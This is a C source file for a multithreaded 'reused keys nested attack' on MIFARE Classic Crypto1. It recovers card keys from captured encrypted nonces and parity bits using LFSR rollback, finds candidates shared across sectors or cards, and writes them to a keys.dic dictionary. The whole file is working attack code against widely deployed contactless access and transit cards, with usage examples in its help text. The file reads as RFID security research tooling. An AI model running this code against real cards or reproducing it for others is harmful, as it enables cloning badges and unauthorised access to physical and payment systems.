// Reused Keys Nested Attack
//
// Attack conditions:
// * Know a first key, to be able to activate the nested authentication protocol
// * The card must reuse some keys across several sectors. Or several cards of an infrastructure share the same key
//
// Strategy:
// * Find all possible key candidates for one reference sector, and check on-the-fly if they are compatible with any other sector we want to compare with
//
//  Doegox, 2024

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <pthread.h>
#include "common.h"
#include "crapto1/crapto1.h"
#include "parity.h"

// max number of concurrent threads
#define NUM_THREADS 20
#define CHUNK_DIVISOR 10

// oversized just in case...
#define KEY_SPACE_SIZE ((1 << 16) * 4)
// we expect intersection to be about 250-500 keys. Oversized just in case...
#define KEY_SPACE_SIZE_STEP2 2000
#define MAX_NR_NONCES 32

typedef struct {
    uint32_t ntp;
    uint32_t ks1;
} NtpKs1;

typedef struct {
    uint32_t authuid;
    NtpKs1 *pNK;
    uint32_t sizeNK;
    uint32_t nt_enc;
    uint8_t nt_par_enc;
} NtData;

typedef struct {
    NtData NtDataList[MAX_NR_NONCES];
    uint32_t nr_nonces;
} NtpKs1List;

// Struct for thread data
typedef struct {
    NtpKs1List *pNKL;
    uint32_t startPos;
    uint32_t endPos;
    uint32_t *keyCount[MAX_NR_NONCES];
    uint64_t *result_keys[MAX_NR_NONCES];
    uint32_t thread_id;
    pthread_mutex_t *keyCount_mutex[MAX_NR_NONCES];
    uint32_t num_nonces;
} thread_data_t;

static bool thread_status[NUM_THREADS];  // To keep track of active threads
static pthread_mutex_t status_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t status_cond = PTHREAD_COND_INITIALIZER;

static uint32_t hex_to_uint32(const char *hex_str) {
    return (uint32_t)strtoul(hex_str, NULL, 16);
}

static int bin_to_uint8_arr(const char *bin_str, uint8_t bit_arr[], uint8_t arr_size) {
    if (strlen(bin_str) != arr_size) {
        fprintf(stderr, "Error: Binary string (%s) length does not match array size (%i).\n", bin_str, arr_size);
        return 1;
    }

    for (uint8_t i = 0; i < arr_size; i++) {
        if (bin_str[i] == '0') {
            bit_arr[i] = 0;
        } else if (bin_str[i] == '1') {
            bit_arr[i] = 1;
        } else {
            fprintf(stderr, "Error: Invalid character '%c' in binary string.\n", bin_str[i]);
            return 1;
        }
    }
    return 0;
}

static uint8_t valid_nonce(uint32_t Nt, uint32_t ks1, uint8_t nt_par_enc) {
    return (oddparity8((Nt >> 24) & 0xFF) == (((nt_par_enc >> 3) & 1) ^ BIT(ks1, 16))) &&
           (oddparity8((Nt >> 16) & 0xFF) == (((nt_par_enc >> 2) & 1) ^ BIT(ks1,  8))) &&
           (oddparity8((Nt >>  8) & 0xFF) == (((nt_par_enc >> 1) & 1) ^ BIT(ks1,  0)));
}

static bool search_match(NtData *pND, NtData *pND0, uint64_t key) {
    bool ret = 0;
    struct Crypto1State *s;
    s = crypto1_create(0);
    if (s == NULL) {
        fprintf(stderr, "\nMalloc error in search_match!\n");
        return 0;
    }
    crypto1_init(s, key);
    uint32_t authuid = pND->authuid;
    uint32_t nt_enc = pND->nt_enc;
    uint8_t nt_par_enc = pND->nt_par_enc;
    uint32_t nt = crypto1_word(s, nt_enc ^ authuid, 1) ^ nt_enc;
    // filter: we know nt should be valid, no need to spend time on other ones
    if (validate_prng_nonce(nt)) {
        // look for same nt
        for (uint32_t k = 0; k < pND->sizeNK; k++) {
            if (nt == pND->pNK[k].ntp) {
                // Possible match
                // filter: check the full 4 bits of parity (actually only the last one might be wrong)
                uint32_t ks1, ks2;
                uint8_t par1, par2, ksp;
                par1 = (oddparity8((nt >> 24) & 0xFF) << 3) | (oddparity8((nt >> 16) & 0xFF) << 2) | (oddparity8((nt >> 8) & 0xFF) << 1) | (oddparity8(nt & 0xFF));
                ks1 = nt ^ nt_enc;
                ks2 = crypto1_word(s, 0, 0);
                ksp = (((ks1 >> 16) & 1) << 3) | (((ks1 >> 8) & 1) << 2) | (((ks1 >> 0) & 1) << 1) | ((ks2 >> 24) & 1);
                par2 = nt_par_enc ^ ksp;

                if (par1 != par2) {
                    continue;
                }

                // filter: same check on the full 4 bits of parity of initial nonce
                // check is slow so we do it only now
                crypto1_init(s, key);
                authuid = pND0->authuid;
                nt_enc = pND0->nt_enc;
                nt_par_enc = pND0->nt_par_enc;
                nt = crypto1_word(s, nt_enc ^ authuid, 1) ^ nt_enc;
                par1 = (oddparity8((nt >> 24) & 0xFF) << 3) | (oddparity8((nt >> 16) & 0xFF) << 2) | (oddparity8((nt >> 8) & 0xFF) << 1) | (oddparity8(nt & 0xFF));
                ks1 = nt ^ nt_enc;
                ks2 = crypto1_word(s, 0, 0);
                ksp = (((ks1 >> 16) & 1) << 3) | (((ks1 >> 8) & 1) << 2) | (((ks1 >> 0) & 1) << 1) | ((ks2 >> 24) & 1);
                par2 = nt_par_enc ^ ksp;
                if (par1 != par2) {
                    continue;
                }

                k = pND->sizeNK;
                ret = 1;
            }
        }
    }
    crypto1_destroy(s);
    return ret;
}

static void *generate_and_intersect_keys(void *threadarg) {
    thread_data_t *data = (thread_data_t *)threadarg;
    NtpKs1List *pNKL = data->pNKL;
    uint32_t startPos = data->startPos;
    uint32_t endPos = data->endPos;
    uint32_t thread_id = data->thread_id;
    uint32_t num_nonces = data->num_nonces;

    struct Crypto1State *revstate, *revstate_start = NULL;
    uint64_t lfsr = 0;

    uint32_t authuid = pNKL->NtDataList[0].authuid;
    for (uint32_t i = startPos; i < endPos; i++) {
        uint32_t ntp = pNKL->NtDataList[0].pNK[i].ntp;
        uint32_t ks1 = pNKL->NtDataList[0].pNK[i].ks1;
        uint32_t nt_probe = ntp ^ authuid;

        revstate = lfsr_recovery32(ks1, nt_probe);
        if (revstate == NULL) {
            fprintf(stderr, "\nMalloc error in generate_and_intersect_keys!\n");
            pthread_exit(NULL);
        }
        if (revstate_start == NULL) {
            revstate_start = revstate;
        }
        uint32_t keyCount0 = 0;
        while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
            lfsr_rollback_word(revstate, nt_probe, 0);
            crypto1_get_lfsr(revstate, &lfsr);
            keyCount0++;
            for (uint32_t nonce_index = 1; nonce_index < num_nonces; nonce_index++) {
                if (search_match(&pNKL->NtDataList[nonce_index], &pNKL->NtDataList[0], lfsr)) {
                    pthread_mutex_lock(data->keyCount_mutex[nonce_index]);
                    data->result_keys[nonce_index][*data->keyCount[nonce_index]] = lfsr;
                    (*data->keyCount[nonce_index])++;
                    pthread_mutex_unlock(data->keyCount_mutex[nonce_index]);
                    if (*data->keyCount[nonce_index] == KEY_SPACE_SIZE_STEP2) {
                        fprintf(stderr, "No space left on result_keys[%d], abort!\n", nonce_index);
                        i = endPos;
                        break;
                    }
                }
            }
            revstate++;
        }
        free(revstate_start);
        revstate_start = NULL;

        pthread_mutex_lock(data->keyCount_mutex[0]);
        (*data->keyCount[0]) += keyCount0;
        keyCount0 = 0;
        pthread_mutex_unlock(data->keyCount_mutex[0]);
    }

    pthread_mutex_lock(&status_mutex);
    thread_status[thread_id] = false;  // Mark thread as inactive
    pthread_cond_signal(&status_cond);       // Signal the main thread
    pthread_mutex_unlock(&status_mutex);
    pthread_exit(NULL);
    return NULL; // Make some compilers happy
}

static uint64_t **unpredictable_nested(NtpKs1List *pNKL, uint32_t keyCounts[]) {
    pthread_t threads[NUM_THREADS];
    thread_data_t thread_data[NUM_THREADS];
    pthread_mutex_t keyCount_mutex[MAX_NR_NONCES];

    uint64_t **result_keys = (uint64_t **)calloc(MAX_NR_NONCES, sizeof(uint64_t *));
    for (uint32_t i = 0; i < MAX_NR_NONCES; i++) {
        // no result_keys[0] stored, would be too large
        if (i != 0) {
            result_keys[i] = (uint64_t *)calloc(KEY_SPACE_SIZE_STEP2, sizeof(uint64_t));
        }
        keyCounts[i] = 0;
        pthread_mutex_init(&keyCount_mutex[i], NULL);
    }

    const uint32_t chunk_size = pNKL->NtDataList[0].sizeNK / NUM_THREADS / CHUNK_DIVISOR;
    uint32_t startPos = 0;

    while (startPos < pNKL->NtDataList[0].sizeNK) {
        pthread_mutex_lock(&status_mutex);
        uint32_t activeThreads = 0;

        // Count active threads
        for (int i = 0; i < NUM_THREADS; i++) {
            if (thread_status[i]) activeThreads++;
        }
        // Spawn new threads if there are available slots
        for (uint32_t t = 0; activeThreads < NUM_THREADS && startPos < pNKL->NtDataList[0].sizeNK && t < NUM_THREADS; t++) {
            if (!thread_status[t]) {
                uint32_t endPos = startPos + chunk_size;
                if (endPos > pNKL->NtDataList[0].sizeNK) {
                    endPos = pNKL->NtDataList[0].sizeNK;
                }

                thread_data[t].pNKL = pNKL;
                thread_data[t].startPos = startPos;
                thread_data[t].endPos = endPos;
                thread_data[t].thread_id = t;
                thread_data[t].num_nonces = pNKL->nr_nonces;
                for (uint32_t i = 0; i < MAX_NR_NONCES; i++) {
                    thread_data[t].result_keys[i] = result_keys[i];
                    thread_data[t].keyCount[i] = &keyCounts[i];
                    thread_data[t].keyCount_mutex[i] = &keyCount_mutex[i];
                }

                thread_status[t] = true;  // Mark thread as active
                pthread_create(&threads[t], NULL, generate_and_intersect_keys, (void *)&thread_data[t]);
                activeThreads++;
                startPos = endPos;
            }
        }

        // Wait for any thread to complete
        while (activeThreads >= NUM_THREADS) {
            pthread_cond_wait(&status_cond, &status_mutex);
            activeThreads = 0;
            for (int i = 0; i < NUM_THREADS; i++) {
                if (thread_status[i]) activeThreads++;
            }
        }

        pthread_mutex_unlock(&status_mutex);
        printf("\33[2K\rProgress: %02.1f%%", (double)(startPos + 1) * 100 / pNKL->NtDataList[0].sizeNK);
        printf(" keys[%d]:%9i", 0, keyCounts[0]);
        for (uint32_t nonce_index = 1; nonce_index < pNKL->nr_nonces; nonce_index++) {
            printf(" keys[%d]:%5i", nonce_index, keyCounts[nonce_index]);
        }
        fflush(stdout);
    }

    pthread_mutex_lock(&status_mutex);
    uint32_t activeThreads = 0;

    // Count active threads
    for (int i = 0; i < NUM_THREADS; i++) {
        if (thread_status[i]) activeThreads++;
    }
    while (activeThreads) {
        pthread_cond_wait(&status_cond, &status_mutex);
        activeThreads = 0;
        for (int i = 0; i < NUM_THREADS; i++) {
            if (thread_status[i]) activeThreads++;
        }
    }

    pthread_mutex_unlock(&status_mutex);

    for (uint32_t i = 1; i < MAX_NR_NONCES; i++) {
        if (keyCounts[i] == 0) {
            free(result_keys[i]);
            result_keys[i] = NULL;
        }
    }

    return result_keys;
}
// Function to compare keys and keep track of their occurrences
static void analyze_keys(uint64_t **keys, uint32_t keyCounts[MAX_NR_NONCES], uint32_t nr_nonces) {
    // Assuming the maximum possible keys
#define MAX_KEYS (MAX_NR_NONCES * KEY_SPACE_SIZE_STEP2)
    uint64_t combined_keys[MAX_KEYS] = {0};
    uint32_t combined_counts[MAX_KEYS] = {0};
    uint32_t combined_length = 0;

    printf("Analyzing keys...\n");
    for (uint32_t i = 0; i < nr_nonces; i++) {
        if (i == 0) {
            printf("nT(%i): %i key candidates\n", i, keyCounts[i]);
            continue;
        } else {
            printf("nT(%i): %i key candidates matching nT(0)\n", i, keyCounts[i]);
        }
        for (uint32_t j = 0; j < keyCounts[i]; j++) {
            uint64_t key = keys[i][j];
            // Check if key is already in combined_keys
            bool found = false;
            for (uint32_t k = 0; k < combined_length; k++) {
                if (combined_keys[k] == key) {
                    combined_counts[k]++;
                    found = true;
                    break;
                }
            }
            // If key not found, add it to combined_keys
            if (!found) {
                combined_keys[combined_length] = key;
                combined_counts[combined_length] = 1;
                combined_length++;
            }
        }
    }

    for (uint32_t i = 0; i < combined_length; i++) {
        if (combined_counts[i] > 1) {
            printf("Key %012" PRIx64 " found in %d arrays: 0", combined_keys[i], combined_counts[i] + 1);
            for (uint32_t ii = 1; ii < nr_nonces; ii++) {
                for (uint32_t j = 0; j < keyCounts[ii]; j++) {
                    if (combined_keys[i] == keys[ii][j]) {
                        printf(", %2i", ii);
                    }
                }
            }
            printf("\n");
        }
    }
}

int main(int argc, char *const argv[]) {
    if (argc < 2) {
        int cmdlen = strlen(argv[0]);
        printf("Usage:\n  %s <uid1> <nt_enc1> <nt_par_err1> <uid2> <nt_enc2> <nt_par_err2> ...\n", argv[0]);
        printf("  UID placeholder: if uid(n)==uid(n-1) you can use '.' as uid(n+1) placeholder\n");
        printf("  parity example:  if nt in trace is 7b! fc! 7a! 5b , then nt_enc is 7bfc7a5b and nt_par_err is 1110\n");
        printf("Example:\n");
        printf("  %*s a13e4902 2e9e49fc 1111 . 7bfc7a5b 1110 a17e4902 50f2abc2 1101\n", cmdlen, argv[0]);
        printf("  %*s +uid1    |        |    +uid2=uid1 |    +uid3    |        |\n", cmdlen, "");
        printf("  %*s          +nt_enc1 |      +nt_enc2 |             +nt_enc3 |\n", cmdlen, "");
        printf("  %*s                   +nt_par_err1    +nt_par_err2           +nt_par_err3\n", cmdlen, "");
        return 1;
    }
    if (argc < 1 + 2 * 3) {
        fprintf(stderr, "Too few nonces, abort. Need 2 nonces min.\n");
        return 1;
    }
    if (argc > 1 + MAX_NR_NONCES * 3) {
        fprintf(stderr, "Too many nonces, abort. Choose max %i nonces.\n", MAX_NR_NONCES);
        return 1;
    }

    NtpKs1List NKL = {0};
    uint64_t **keys = NULL;
    uint32_t keyCounts[MAX_NR_NONCES] = {0};

    uint32_t authuid = hex_to_uint32(argv[1]);
    // process all args.
    printf("Generating nonce candidates...\n");
    for (uint32_t i = 1; i < argc; i += 3) {
        // uid + ntEnc + parEnc
        if (strcmp(argv[i], ".") != 0) {
            authuid = hex_to_uint32(argv[i]);
        }
        uint32_t nt_enc = hex_to_uint32(argv[i + 1]);
        uint8_t nt_par_err_arr[4];
        if (bin_to_uint8_arr(argv[i + 2], nt_par_err_arr, 4)) {
            return 1;
        }
        uint8_t nt_par_enc = ((nt_par_err_arr[0] ^ oddparity8((nt_enc >> 24) & 0xFF)) << 3) |
                             ((nt_par_err_arr[1] ^ oddparity8((nt_enc >> 16) & 0xFF)) << 2) |
                             ((nt_par_err_arr[2] ^ oddparity8((nt_enc >>  8) & 0xFF)) << 1) |
                             ((nt_par_err_arr[3] ^ oddparity8((nt_enc >>  0) & 0xFF)) << 0);
        NtData *pNtData = &NKL.NtDataList[NKL.nr_nonces];
        // Try to recover the keystream1
        uint32_t nttest = prng_successor(1, 16); // a first valid nonce
        pNtData->pNK = (NtpKs1 *)calloc(8192, sizeof(NtpKs1)); // 2**16 filtered with 3 parity bits => 2**13
        if (pNtData->pNK == NULL) {
            return 1;
        }
        uint32_t j = 0;
        for (uint16_t m = 1; m; m++) {
            uint32_t ks1 = nt_enc ^ nttest;
            if (valid_nonce(nttest, ks1, nt_par_enc)) {
                pNtData->pNK[j].ntp = nttest;
                pNtData->pNK[j].ks1 = ks1;
                j++;
            }
            nttest = prng_successor(nttest, 1);
        }
        printf("uid=%08x nt_enc=%08x nt_par_err=%i%i%i%i nt_par_enc=%i%i%i%i %i/%i: %d\n", authuid, nt_enc,
               nt_par_err_arr[0], nt_par_err_arr[1], nt_par_err_arr[2], nt_par_err_arr[3],
               (nt_par_enc >> 3) & 1, (nt_par_enc >> 2) & 1, (nt_par_enc >> 1) & 1, nt_par_enc & 1,
               NKL.nr_nonces + 1, (argc - 1) / 3, j);

        pNtData->authuid = authuid;
        pNtData->sizeNK = j;
        pNtData->nt_enc = nt_enc;
        pNtData->nt_par_enc = nt_par_enc;
        NKL.nr_nonces++;
    }

    printf("Finding key candidates...\n");
    keys = unpredictable_nested(&NKL, keyCounts);
    printf("\n\nFinding phase complete.\n");

    for (uint32_t k = 0; k < NKL.nr_nonces; k++)
        free(NKL.NtDataList[k].pNK);

    analyze_keys(keys, keyCounts, NKL.nr_nonces);
    FILE *fptr;
    // opening the file in read mode
    fptr = fopen("keys.dic", "w");
    if (fptr != NULL) {
        for (uint32_t i = 1; i < NKL.nr_nonces; i++) {
            if (keyCounts[i] > 0) {
                for (uint32_t j = 0; j < keyCounts[i]; j++) {
                    fprintf(fptr, "%012" PRIx64 "\n", keys[i][j]);
                }
            }
        }
        fclose(fptr);
    } else {
        fprintf(stderr, "Warning: Cannot save keys in keys.dic\n");
    }
    for (uint32_t i = 1; i < NKL.nr_nonces; i++) {
        if (keys[i] != NULL) {
            free(keys[i]);
        }
    }
    if (keys != NULL) {
        free(keys);
    }

    return 0;
}
